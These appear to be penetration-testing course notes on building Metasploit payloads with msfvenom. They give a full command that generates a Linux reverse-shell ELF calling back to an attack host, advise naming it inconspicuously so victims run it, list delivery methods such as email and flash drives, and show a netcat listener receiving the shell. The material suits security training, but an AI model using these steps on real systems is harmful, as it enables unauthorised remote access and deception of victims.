# Crafting Payloads with MSFvenom
## Staged vs. Stageless Payloads
- **Staged** payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload `linux/x86/shell/reverse_tcp`. When run using an exploit module in Metasploit, this payload will send a small stage that will be executed on the target and then call back to the attack box to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. 
- **Stageless** payloads do not have a stage. Take for example this payload linux/zarch/meterpreter_reverse_tcp. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. 
- The name will give you your first marker. Take our examples from above, `linux/x86/shell/reverse_tcp` is a staged payload, and we can tell from the name since each `/` in its name represents a stage from the shell forward. So `/shell/` is a stage to send, and `/reverse_tcp` is another. This will look like it is all pressed together for a stageless payload. Take our example `linux/zarch/meterpreter_reverse_tcp`. It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function `/meterpreter_reverse_tcp`. 

## Building A Stageless Payload
```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```
- `-p`: Indicates that msfvenom is creating a payload.
- `linux/x64/shell_reverse_tcp`: Specifies a Linux 64-bit stageless payload that will initiate a TCP-based reverse shell (shell_reverse_tcp).
- `LHOST=10.10.14.113 LPORT=443`: When executed, the payload will call back to the specified IP address (`10.10.14.113`) on the specified port (`443`).
- `-f elf`: Specifies the format the generated binary will be in. In this case, it will be an `.elf` file.
- `> createbackup.elf`: Creates the `.elf` binary and names the file createbackup. We can name this file whatever we want. Ideally, we would call it something inconspicuous and/or something someone would be tempted to download and execute.

## Executing a Stageless Payload
At this point, we have the payload created on our attack box. We would now need to develop a way to get that payload onto the target system:
- Email message.
- Download link on a website.
- Combined with Metasploit module.
- Via flash drive as part of an onsite penetration test.

Once the file is on that system, it will also need to be executed.

Once executed, we would need a listener ready to catch the connection on the attack box side upon successful execution:
```
$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.138.85 60892
env
PWD=/home/htb-student/Downloads
cd ..
ls
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```